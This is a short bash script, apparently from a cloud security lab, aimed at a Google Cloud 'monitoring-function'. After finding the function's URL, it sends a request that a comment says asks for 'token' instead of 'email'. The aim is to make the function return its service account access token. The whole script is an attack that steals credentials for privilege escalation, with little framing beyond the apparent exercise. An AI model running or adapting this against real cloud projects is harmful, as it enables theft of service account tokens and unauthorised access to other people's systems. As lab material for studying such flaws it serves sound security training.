#!/bin/bash

# Check if required environment variables are set
if [ -z "$LOCATION" ]; then
    echo "Error: LOCATION environment variable is not set" >&2
    echo "Please run: export LOCATION=us-east1" >&2
    exit 1
fi

if [ -z "$PROJECT_ID" ]; then
    echo "Error: PROJECT_ID environment variable is not set" >&2
    echo "Please run: export PROJECT_ID=<your-project-id>" >&2
    exit 1
fi

# Check if function URL is provided via file (created during setup)
if [ -f "/home/alice/.function_url" ]; then
    FUNCTION_URL=$(cat "/home/alice/.function_url")
    echo "Using function URL from file" >&2
elif [ -n "$FUNCTION_URL" ]; then
    echo "Using function URL from environment variable" >&2
else
    # Try to get the Gen2 function URL dynamically (will fail on VM due to permissions)
    echo "Getting function URL for monitoring-function in region $LOCATION..." >&2
    FUNCTION_URL=$(gcloud run services describe monitoring-function \
      --region=$LOCATION \
      --format='value(status.url)' 2>/dev/null)
    
    if [ -z "$FUNCTION_URL" ]; then
        echo "Error: Could not retrieve function URL" >&2
        echo "The VM doesn't have permissions to describe Cloud Run services." >&2
        echo "Please check if /home/alice/.function_url file exists," >&2
        echo "or set FUNCTION_URL environment variable with the monitoring function URL." >&2
        exit 1
    fi
fi

echo "Function URL: $FUNCTION_URL" >&2
echo "" >&2

# Send request - request 'token' instead of 'email' to get the access token
echo "Invoking function to retrieve metadata..." >&2
FUNCTION_RESPONSE=$(curl -s -X POST "$FUNCTION_URL" \
  -H "Authorization: Bearer $(gcloud auth print-identity-token)" \
  -H "Content-Type: application/json" \
  -d '{"metadata": "token"}')

echo $FUNCTION_RESPONSE